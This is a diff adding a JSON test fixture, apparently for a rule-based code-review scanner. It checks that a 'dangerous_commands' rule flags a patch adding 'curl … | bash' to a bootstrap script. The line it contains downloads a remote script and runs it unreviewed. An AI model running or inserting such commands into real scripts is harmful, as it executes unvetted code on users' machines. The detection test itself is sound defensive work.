@@ -1,0 +1,21 @@
+{
+  "id": "dangerous_commands_hit_curl_bash",
+  "kind": "rules",
+  "files": [
+    {
+      "filename": "scripts/bootstrap.sh",
+      "status": "modified",
+      "patch": "@@ -10,0 +10,1 @@\n+curl -fsSL https://example.com/install.sh | bash\n"
+    }
+  ],
+  "expect": {
+    "must_hit": [
+      {
+        "rule_id": "dangerous_commands",
+        "path": "scripts/bootstrap.sh",
+        "line": 10
+      }
+    ],
+    "must_not": []
+  }
+}
